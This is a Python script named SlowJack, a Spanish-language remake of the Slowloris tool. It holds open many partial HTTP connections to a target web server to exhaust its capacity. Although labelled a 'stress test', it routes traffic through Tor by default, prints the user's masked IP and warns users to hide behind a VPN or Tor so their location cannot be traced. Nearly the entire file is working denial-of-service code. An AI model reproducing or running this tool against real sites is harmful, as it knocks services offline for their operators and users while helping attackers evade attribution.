#!/usr/bin/env python3
#Edicion Modificada por Neo-Jack Ene/2020
#SlowJack its a remake of SlowLoris
import click    
import argparse
import logging
import random
import socket
import socks    
import requests 
import sys
import time
from colorama import Fore, Back, Style 
import urllib2


parser = argparse.ArgumentParser(
    description="SlowJack, herramienta de prueba de esfuerzo de bajo ancho de banda para sitios web"
)
parser.add_argument("host", nargs="?", help="Servidor para inicar el Test")
parser.add_argument(
    "-p", "--port", default=80, help="Puerto del servidor Web, Usualmente 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=150,
    type=int,
    help="Numero de clientes para usar en el test",

)
parser.add_argument(
    "-v", "--verbose", dest="verbose",
    action="store_true",
    help="Muestra clientes Creados"
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Identidade de Navegador Aleatorea en cada peticion",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Usar SOCKS5 proxy para conectar",
)
parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
parser.add_argument("--proxy-port", default="8080", help="SOCKS5 proxy port", type=int)
parser.add_argument(
    "--https", 
    dest="https", 
    action="store_true", 
    help="Usar HTTPS para la peticion"
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Tiempo de descanso entre cada envio header.",
)

parser.add_argument("-T", "--tor", dest="tor", action="store_true", help="Habilitar el enrutamiento TOR")
parser.set_defaults(tor=True) 
parser.set_defaults(verbose=True) 
parser.set_defaults(randuseragent=True) 
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:

    parser.print_help()
    sys.exit(1)

if not args.host:
    print("REQUIERE un Host !!!")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    # Tries to import to external "socks" library
    # and monkey patches socket.socket to connect over
    # the proxy by default
    try:
        import socks

        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("Usando SOCKS5 proxy para Conectar...")
    except ImportError:
        logging.error("Libreria Socks Proxy NO Disponible!")

if args.verbose:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG,
    )
else:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.INFO,
    )

if args.https:
    logging.info("Importando Modulo ssl")
    import ssl

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Neo) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Neo) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Neo) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Neo) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Neo) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Neo) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Neo) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Neo) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Neo/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Neo/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Neo",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Neo/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Neo) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Neo/20100101 Firefox/49.0",
]

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if args.https:
        s = ssl.wrap_socket(s)

    s.connect((ip, args.port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    if args.randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s

def check_url( url, timeout=5 ):
	
    try:
        return urllib2.urlopen(url,timeout=timeout).getcode() == 200
    except urllib2.URLError as e:
        return False
    except socket.timeout as e:
        return False

if args.tor is True:
    ipcheck_url = 'http://canihazip.com/s' 
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050) 
    socket.socket = socks.socksocket
    try:
        logging.info(Back.CYAN + Fore.YELLOW + Style.BRIGHT + "Comprabando la Seguridad de su RED..." + Style.RESET_ALL) 
        tor_ip = requests.get(ipcheck_url) 
        tor_ip = str(tor_ip.text) 
    except requests.exceptions.RequestException as e:
        sys.exit(0)

if args.tor is False: 
    ipcheck_url2 = 'http://canihazip.com/s' 
    try: 
        logging.info(Back.CYAN + Fore.YELLOW + Style.BRIGHT + "Comprabando la Seguridad de su RED..." + Style.RESET_ALL)  
        regular_ip = requests.get(ipcheck_url2) 
        regular_ip = str(regular_ip.text) 

    except requests.exceptions.RequestException as e:
        sys.exit(0)

def main():
    ip = args.host
    socket_count = args.sockets
    logging.info(Fore.GREEN + Style.BRIGHT + "Tu Host Actual es: " + socket.gethostbyname(socket.gethostname()) + Style.RESET_ALL)
    if args.tor is True:
       logging.info(Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.GREEN + "Activada" + Style.RESET_ALL)
       logging.info(Fore.GREEN + Style.BRIGHT + "Nueva Tor-IP Externa: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + tor_ip + Style.RESET_ALL)
       logging.info(Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "Todo parece en orden, comencemos... " + Style.RESET_ALL )
    if args.tor is False:
       logging.info(Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.RED + "Desactivado"+ Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " o " + Style.RESET_ALL + Back.RED + "NO Encontrada" + Style.RESET_ALL)
       logging.info(Fore.GREEN + Style.BRIGHT + "Tu IP Externo es: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + regular_ip + Style.RESET_ALL)
       logging.info(Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + "Utilice siempre una conexion VPN..." + Style.RESET_ALL)
       logging.info(Fore.YELLOW + Style.BRIGHT + "Si usted no cuenta con VPN y/o TOR" + Style.RESET_ALL)
       logging.info(Fore.YELLOW + Style.BRIGHT + "NO se arriesgue y NO utilice este progrema." + Style.RESET_ALL)
       logging.info(Fore.YELLOW + Style.BRIGHT + "Sin una proteccion adecuada, su ubicacion podria ser rastreada.." + Style.RESET_ALL)
       click.confirm('..................... ' +Back.RED + Fore.GREEN + Style.BRIGHT +'Quieres Continuar?' + Style.RESET_ALL, abort=True)
    logging.info(Back.GREEN + "Iniciando Testeo a:" + Style.RESET_ALL + Back.RED + " %s" + Style.RESET_ALL + Back.GREEN + " con "  + Style.RESET_ALL + Back.BLUE + "%s clientes." + Style.RESET_ALL, ip, socket_count)
    logging.info("Chequeando Estado del Servidor... 5 seg")
    resultado = check_url("http://" + args.host)
    if resultado == True:
       logging.info("Servidor %s:" + Back.GREEN + " Operando " + Style.RESET_ALL, ip)
    if not resultado == True:
       logging.info("Servidor %s:" + Back.RED +  " No Disponible " + Style.RESET_ALL, ip)
    logging.info(Back.BLUE +"Creando Clientes..." + Style.RESET_ALL + " Espere por favor... %s seg aprox.", socket_count//1.5)
    for _ in range(socket_count):

        try:
            logging.debug( Back.MAGENTA + "Creando" + Style.RESET_ALL + " cliente Num:" + Fore.RED +" %s" + Style.RESET_ALL, _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            logging.info(Back.GREEN + "TESTEANDO a:" + Style.RESET_ALL + Back.RED +  " %s" + Style.RESET_ALL, ip)
            logging.info(
                "Enviando headers para mantener TEST activo... Con %s Clientes", len(list_of_sockets)
            )
            logging.info("Navegadores Aleatoreas: %s", len(user_agents))
            logging.info("Chequeando Estado del Servidor... 5 seg")
            resultado = check_url("http://" + args.host)
            if resultado == True:
               logging.info(Style.BRIGHT + "Servidor " + Style.RESET_ALL + "%s: " + Style.RESET_ALL + Back.GREEN + "Operando. " + Style.RESET_ALL, ip)
            if not resultado == True:
               logging.info(Style.BRIGHT + "Servidor " + Style.RESET_ALL + "%s: " + Back.RED +  "No Disponible. " + Style.RESET_ALL, ip)

            for s in list(list_of_sockets):
                try:
                    s.send(
                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    list_of_sockets.remove(s)

            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug( Back.YELLOW + "Recreando" + Style.RESET_ALL + " cliente Num:" + Fore.RED +" %s" + Style.RESET_ALL, _)
                try:
                    s = init_socket(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug(e)
                    break
            logging.debug( Back.CYAN + "Durminedo" + Style.RESET_ALL + " por %d segundo.", args.sleeptime)
            logging.debug(".............." + Fore.CYAN + "Espere por favor" + Style.RESET_ALL + ".................")
            time.sleep(args.sleeptime)
            logging.debug(Fore.GREEN + "..............................................." + Style.RESET_ALL)


        except (KeyboardInterrupt, SystemExit):
            logging.info("Deteniendo SlowJack")
            break


if __name__ == "__main__":
    main()
